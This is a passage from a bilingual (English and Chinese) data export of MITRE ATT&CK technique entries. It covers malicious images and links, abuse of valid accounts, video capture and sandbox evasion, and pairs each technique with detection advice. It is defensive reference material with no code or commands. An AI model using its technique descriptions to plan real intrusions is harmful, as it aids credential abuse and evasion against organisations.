Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)",https://attack.mitre.org/techniques/T1204/003,30 March 2021,26 August 2021,1.1,Execution,"Monitor the local image registry to make sure malicious images are not added. Track the deployment of new containers, especially from newly built images. Monitor the behavior of containers within the environment to detect anomalous behavior or malicious activity after users deploy from malicious images.","Containers, IaaS","Application Log: Application Log Content, Command: Command Execution, Container: Container Creation, Container: Container Start, Image: Image Creation, Instance: Instance Creation, Instance: Instance Start",True,T1204,,"Center for Threat-Informed Defense (CTID); Vishwas Manral, McAfee",User,,,,,,"(Citation: Lacework TeamTNT May 2021),(Citation: Content trust in Docker),(Citation: Content trust in Azure Container Registry)",用户执行：恶意图像,攻击者可能会依赖运行恶意图像的用户来促进执行。亚马逊网络服务 (AWS) 亚马逊机器映像 (AMI)、谷歌云平台 (GCP) 映像和 Azure 映像以及 Docker 等流行的容器运行时都可以被安装后门。后门镜像可以通过 [Upload Malware](https://attack.mitre.org/techniques/T1608/001) 上传到公共存储库，然后用户可以在没有意识到镜像的情况下从镜像下载和部署实例或容器是恶意的，因此绕过了专门实现初始访问的技术。这可能导致在实例或容器中执行恶意代码，例如执行加密货币挖掘的代码。（引用：Summit Route 恶意 AMI）攻击者还可能以某种方式命名图像，以增加用户错误部署实例的机会或图像中的容器（例如：[匹配合法名称或位置](https://attack.mitre.org/techniques/T1036/005)）。（引用：Aqua Security Cloud Native Threat Report 2021 年 6 月）
T1204.001,User Execution: Malicious Link,An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).,https://attack.mitre.org/techniques/T1204/001,11 March 2020,11 March 2020,1.0,Execution,"Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.

Anti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.","Linux, Windows, macOS","File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content",True,T1204,,,User,,,,,,"(Citation: CSM Elderwood Sept 2012),(Citation: FireEye Fin8 May 2016),(Citation: FireEye Obfuscation June 2017),(Citation: IBM Grandoreiro April 2020),(Citation: ATT QakBot April 2021),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Symantec Elderwood Sept 2012),(Citation: Cylance Machete Mar 2017),(Citation: Group IB Ransomware September 2020),(Citation: ESET Operation Spalax Jan 2021),(Citation: Cybereason Bazar July 2020),(Citation: Volexity Patchwork June 2018),(Citation: MSTIC NOBELIUM May 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: KISA Operation Muzabi),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: FireEye APT33 Sept 2017),(Citation: Carbon Black Emotet Apr 2019),(Citation: Threatpost Hancitor),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Unit42 Molerat Mar 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Google Election Threats October 2020),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: McAfee Night Dragon),(Citation: FBI FLASH APT39 September 2020),(Citation: Malwarebytes Pony April 2016),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Trend Micro Qakbot December 2020),(Citation: Secureworks IRON RITUAL USAID Phish May 2021),(Citation: FireEye Clandestine Wolf),(Citation: Cyble Sidewinder September 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Proofpoint TA505 June 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Cylance Dust Storm),(Citation: Talos Transparent Tribe May 2021),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: ESET Turla Mosquito Jan 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Symantec Elfin Mar 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Kroll Qakbot June 2020),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: McAfee Dianxun March 2021),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ATT Sidewinder January 2021),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Talos Oblique RAT March 2021),(Citation: Proofpoint TA505 Mar 2018),(Citation: FireEye NETWIRE March 2019),(Citation: Trend Micro Qakbot May 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: Proofpoint TA505 Sep 2017),(Citation: FOX-IT May 2016 Mofang),(Citation: Kaspersky MoleRATs April 2019),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: FireEye APT29 Nov 2018),(Citation: ESET EvilNum July 2020),(Citation: Securelist Machete Aug 2014),(Citation: ESET Dukes October 2019),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Trend Micro TA505 June 2019),(Citation: Cybereason TA505 April 2019),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Zscaler Bazar September 2020),(Citation: Unit 42 NETWIRE April 2020),(Citation: FireEye APT39 Jan 2019),(Citation: Cybereason Bumblebee August 2022),(Citation: ESET Machete July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Volexity Ocean Lotus November 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Symantec Patchwork),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Talos Cobalt Group July 2018),(Citation: Anomali Static Kitten February 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: Certfa Charming Kitten January 2021),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: SANS Windshift August 2018),",用户执行：恶意链接,攻击者可能会依赖用户点击恶意链接来获得执行。用户可能会受到社会工程的影响，以使他们单击将导致代码执行的链接。此用户操作通常会被视为来自 [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) 的后续行为。单击链接还可能导致其他执行技术，例如通过 [Exploitation for Client Execution] (https://attack.mitre.org/techniques/T1203) 利用浏览器或应用程序漏洞。链接也可能导致用户通过[恶意文件](https://attack.mitre.org/techniques/T1204/002)下载需要执行的文件。
T1078,Valid Accounts,"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",https://attack.mitre.org/techniques/T1078,31 May 2017,19 October 2022,2.5,"Defense Evasion, Initial Access, Persistence, Privilege Escalation","Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).

Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","Azure AD, Containers, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication",False,,"Anti-virus, Application Control, Firewall, Host Intrusion Prevention Systems, Network Intrusion Detection System, System Access Controls","Jon Sternstein, Stern Security; Mark Wee; Netskope; Praetorian; Prasad Somasamudram, McAfee; Sekhar Sarukkai, McAfee; Syed Ummar Farooqh, McAfee; Yossi Weizman, Azure Defender Research Team","Administrator, User",,,CAPEC-560,,"Administrator, User","(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Cycraft Chimera April 2020),(Citation: Symantec Cicada November 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Anomali Linux Rabbit 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Microsoft NICKEL December 2021),(Citation: FoxIT Wocao December 2019),(Citation: Microsoft STRONTIUM Aug 2019),(Citation: FireEye APT39 Jan 2019),(Citation: RSA2017 Detect and Respond Adair),(Citation: FireEye FIN10 June 2017),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: FireEye Respond Webinar July 2017),(Citation: McAfee Night Dragon),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Unit 42 Playbook Dec 2017),(Citation: US-CERT Ukraine Feb 2016),(Citation: Symantec W32.Duqu),(Citation: Symantec Suckfly May 2016),(Citation: Microsoft POLONIUM June 2022),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Trend Micro Pawn Storm April 2017),(Citation: ESET Industroyer),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: PWC Cloud Hopper April 2017),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Bizeul 2014),(Citation: Dell TG-3390),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Group IB Silence Sept 2018),(Citation: FireEye APT33 Webinar Sept 2017),(Citation: Accenture MUDCARP March 2019),(Citation: FireEye APT33 Guardrail),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Novetta-Axiom),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Securelist APT10 March 2021),(Citation: Symantec Seaduke 2015),(Citation: Visa FIN6 Feb 2019),(Citation: Gigamon Berserk Bear October 2021),(Citation: DOJ Iran Indictments March 2018),(Citation: CrowdStrike Grim Spider May 2019),(Citation: FireEye TRITON 2019),(Citation: Aqua Kinsing April 2020),(Citation: FireEye FIN6 April 2016),(Citation: US-CERT TA18-074A),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Kaspersky Carbanak),(Citation: CyberBit Dtrack),(Citation: TechNet Least Privilege),(Citation: TechNet Credential Theft),(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet),(Citation: Microsoft Securing Privileged Access)",有效凭证,攻击者可能会获取和滥用现有帐户的凭据，作为获得初始访问权限、持久性、权限升级或防御规避的手段。受损凭据可用于绕过对网络内系统上各种资源的访问控制，甚至可用于对远程系统和外部可用服务（例如 VPN、Outlook Web Access、网络设备和远程桌面）的持久访问。（引用：volexity_0day_sophos_FW) 受损的凭据还可能授予对手增加特定系统或访问网络受限区域的权限。攻击者可能会选择不将恶意软件或工具与这些凭据提供的合法访问结合使用，以使其更难检测到它们的存在。在某些情况下，攻击者可能会滥用不活跃的帐户：例如，那些属于不再属于组织的个人的帐户。使用这些帐户可能会让对手逃避检测，因为原始帐户用户不会出现以识别其帐户上发生的任何异常活动。（引用：CISA MFA PrintNightmare）本地、域和云帐户的权限重叠跨系统网络是令人担忧的，因为攻击者可能能够跨帐户和系统进行枢转以达到高级访问权限（即域或企业管理员）以绕过企业内设置的访问控制。（引用：TechNet 凭据盗窃)
T1078.004,Valid Accounts: Cloud Accounts,"Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)

Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a [Trusted Relationship](https://attack.mitre.org/techniques/T1199). Similar to [Domain Accounts](https://attack.mitre.org/techniques/T1078/002), compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.

Once a cloud account is compromised, an adversary may perform [Account Manipulation](https://attack.mitre.org/techniques/T1098) - for example, by adding [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) - to maintain persistence and potentially escalate their privileges.",https://attack.mitre.org/techniques/T1078/004,13 March 2020,19 April 2022,1.4,"Defense Evasion, Initial Access, Persistence, Privilege Escalation","Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.","Azure AD, Google Workspace, IaaS, Office 365, SaaS","Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication",True,T1078,,"Jon Sternstein, Stern Security","Administrator, User",,,,,,"(Citation: Peirates GitHub),(Citation: Microsoft Holmium June 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Microsoft NICKEL December 2021),(Citation: Roadtools),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: TechNet Least Privilege),(Citation: AWS - IAM Console Best Practices),(Citation: TechNet Credential Theft)",有效凭证：云账户,攻击者可能会获取和滥用云帐户的凭据，以作为获得初始访问、持久性、权限升级或防御规避的手段。云帐户是由组织创建和配置的帐户，供用户、远程支持、服务使用，或用于管理云服务提供商或 SaaS 应用程序中的资源。在某些情况下，云帐户可能与传统身份管理系统联合，例如 Window Active Directory。（引用：AWS Identity Federation）（引用：Google Federated GC）（引用：Microsoft Deploying AD Federation）用于从在线存储帐户和数据库中收集敏感数据。通过滥用 [受信任的关系] (https://attack.mitre.org/techniques/T1199)，还可以滥用对云帐户的访问权限来获得对网络的初始访问权限。与 [域帐户](https://attack.mitre.org/techniques/T1078/002) 类似，联合云帐户的入侵可能使攻击者更容易在环境中横向移动。一旦云帐户遭到入侵，攻击者可能会执行 [帐户操纵](https://attack.mitre.org/techniques/T1098) - 例如，通过添加 [其他云角色](https://attack.mitre. org/techniques/T1098/003) - 保持持久性并可能提升他们的权限。
T1078.001,Valid Accounts: Default Accounts,"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)

Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)",https://attack.mitre.org/techniques/T1078/001,13 March 2020,05 April 2021,1.2,"Defense Evasion, Initial Access, Persistence, Privilege Escalation","Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Logon Session: Logon Session Creation, User Account: User Account Authentication",True,T1078,,,"Administrator, User",,,CAPEC-70,,,"(Citation: Accenture HyperStack October 2020),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)",有效凭证：默认账户,攻击者可能会获取和滥用默认帐户的凭据，以作为获得初始访问、持久性、特权升级或防御规避的手段。默认帐户是操作系统内置的帐户，例如 Windows 系统上的访客或管理员帐户。默认帐户还包括其他类型的系统、软件或设备上的默认工厂/供应商设置帐户，包括 AWS 中的根用户帐户和 Kubernetes 中的默认服务帐户。（引用：Microsoft 本地帐户 2019 年 2 月）（引用：AWS 根User)(Citation: Threat Matrix for Kubernetes) 默认账户不仅限于客户端机器，还包括为网络设备和计算机应用程序等设备预设的账户，无论它们是内部的、开源的还是商业的。预设用户名和密码组合的设备对安装后不更改的组织构成严重威胁，因为它们很容易成为攻击者的目标。同样，攻击者也可能利用公开披露或窃取的 [私钥] (https://attack.mitre.org/techniques/T1552/004) 或凭证材料通过 [远程服务] (https:// attack.mitre.org/techniques/T1021）。（引用：Metasploit SSH 模块）
T1078.002,Valid Accounts: Domain Accounts,"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)

Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",https://attack.mitre.org/techniques/T1078/002,13 March 2020,19 April 2022,1.2,"Defense Evasion, Initial Access, Persistence, Privilege Escalation","Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).

On Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd).(Citation: Ubuntu SSSD Docs) 

Perform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.","Linux, Windows, macOS","Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication",True,T1078,,"Jon Sternstein, Stern Security","Administrator, User",,,CAPEC-560,,,"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: CrowdStrike StellarParticle January 2022),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: McAfee Night Dragon),(Citation: NCSC APT29 July 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Unit 42 Shamoon3 2018),(Citation: Microsoft POLONIUM June 2022),(Citation: Symantec Buckeye),(Citation: Dell TG-1314),(Citation: FireEye Shamoon Nov 2016),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: CobaltStrike Daddy May 2017),(Citation: cobaltstrike manual),(Citation: Bitdefender Naikon April 2021),(Citation: ESET Dukes October 2019),(Citation: NCC Group Chimera January 2021),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: IBM TA505 April 2020),(Citation: ANSSI RYUK RANSOMWARE),",有效凭证：域帐户,攻击者可能会获取和滥用域帐户的凭据，以作为获得初始访问、持久性、特权升级或防御规避的一种手段。（引用：TechNet 凭据盗窃）域帐户是由 Active Directory 域服务管理的帐户，其中配置了访问和权限跨属于该域的系统和服务。域帐户可以涵盖用户、管理员和服务。（引用：Microsoft AD 帐户）攻击者可能会通过 [OS 凭据转储](https://attack.mitre) 等各种手段破坏域帐户，其中一些具有高级别的权限.org/techniques/T1003）或密码重用，允许访问域的特权资源。
T1078.003,Valid Accounts: Local Accounts,"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",https://attack.mitre.org/techniques/T1078/003,13 March 2020,18 October 2021,1.2,"Defense Evasion, Initial Access, Persistence, Privilege Escalation","Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.","Containers, Linux, Windows, macOS","Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication",True,T1078,,,"Administrator, User",,,,,,"(Citation: CobaltStrike Daddy May 2017),(Citation: Bitdefender StrongPity June 2020),(Citation: FireEye APT32 May 2017),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: FireEye Exchange Zero Days March 2021),(Citation: cobaltstrike manual),(Citation: ESET Crutch December 2020),(Citation: US-CERT NotPetya 2017),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Malwarebytes Emotet Dec 2017),(Citation: Talos Nyetya June 2017),(Citation: FoxIT Wocao December 2019),(Citation: Umbreon Trend Micro),(Citation: FireEye FIN10 June 2017),(Citation: TechNet Least Privilege),(Citation: TechNet Credential Theft),(Citation: Microsoft Remote Use of Local)",有效凭证：本地账户,攻击者可能会获取和滥用本地帐户的凭据，以作为获得初始访问权限、持久性、权限升级或防御规避的手段。本地帐户是由组织配置供用户、远程支持、服务使用或用于管理单个系统或服务的帐户。本地帐户也可能被滥用以通过 [OS Credential Dumping] (https://attack.mitre.org/techniques/T1003) 提升权限和获取凭证。出于特权升级和横向移动的目的，密码重用可能允许跨网络上的一组机器滥用本地帐户。
T1125,Video Capture,"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.

In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",https://attack.mitre.org/techniques/T1125,31 May 2017,15 March 2022,1.1,Collection,"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.

Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution",False,,,Praetorian,User,,,CAPEC-634,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: SecureList Silence Nov 2017),(Citation: Kaspersky Adwind Feb 2016),(Citation: jRAT Symantec Aug 2018),(Citation: Fidelis njRAT June 2013),(Citation: Cylance Shaheen Nov 2018),(Citation: Github PowerShell Empire),(Citation: EFF Manul Aug 2016),(Citation: DOJ FIN7 Aug 2018),(Citation: Check Point Warzone Feb 2020),(Citation: Fortinet Remcos Feb 2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: GitHub Pupy),(Citation: Imminent Unit42 Dec2019),(Citation: Talos Oblique RAT March 2021),(Citation: GitHub QuasarRAT),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: FireEye Periscope March 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: 360 Machete Sep 2020),(Citation: Cylance Machete Mar 2017),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Proofpoint TA505 October 2019),(Citation: Anomali Static Kitten February 2021),(Citation: Talos ZxShell Oct 2014),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Group IB Silence Sept 2018),(Citation: Volexity Patchwork June 2018),(Citation: DigiTrust NanoCore Jan 2017),(Citation: Zscaler Cobian Aug 2017),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: Talos Agent Tesla Oct 2018),(Citation: Palo Alto T9000 Feb 2016),(Citation: Securelist Machete Aug 2014),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Citizen Lab Group5),(Citation: Trend Micro DRBControl February 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: IBM TA505 April 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro DarkComet Sept 2014),",视频截取/捕获,攻击者可以利用计算机的外围设备（例如，集成摄像头或网络摄像头）或应用程序（例如，视频呼叫服务）来捕获视频记录，以收集信息。图像也可以从设备或应用程序中捕获，可能以指定的时间间隔代替视频文件。恶意软件或脚本可用于通过操作系统或应用程序提供的可用 API 与设备交互，以捕获视频或图像。视频或图像文件可能会被写入磁盘并在以后被泄露。这种技术不同于 [Screen Capture](https://attack.mitre.org/techniques/T1113)，因为它使用特定设备或应用程序进行视频录制，而不是捕获受害者的屏幕。在 macOS 中，有一些不同的恶意软件样本会记录用户的网络摄像头，例如 FruitFly 和 Proton。 （引文：Objective-see 2017 review）
T1497,Virtualization/Sandbox Evasion,"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)

",https://attack.mitre.org/techniques/T1497,17 April 2019,18 October 2021,1.3,"Defense Evasion, Discovery","Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis",Deloitte Threat Library Team; Sunny Neo,,,,,,,"(Citation: ESET Gelsemium June 2021),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: Kaspersky Lyceum October 2021),(Citation: Unit42 Redaman January 2019),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye APT28),(Citation: Unit 42 Gamaredon February 2022),(Citation: ESET Operation Spalax Jan 2021),(Citation: Cybereason Bazar July 2020),(Citation: NHS Digital Egregor Nov 2020),(Citation: Medium Metamorfo Apr 2020),(Citation: FireEye Hancitor),(Citation: Kaspersky StoneDrill 2017),(Citation: F-Secure CozyDuke),(Citation: Proofpoint Bumblebee April 2022),(Citation: ESET Carberp March 2012),(Citation: Cyble Egregor Oct 2020),(Citation: Netskope Squirrelwaffle Oct 2021),",虚拟化/沙箱规避/绕过,攻击者可能会采用各种手段来检测和避开虚拟化和分析环境。这可能包括基于检查是否存在指示虚拟机环境 (VME) 或沙箱的工件的结果来更改行为。如果对手检测到 VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可以在删除辅助或附加有效负载之前搜索 VME 工件。攻击者可以在自动发现过程中使用从 [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) 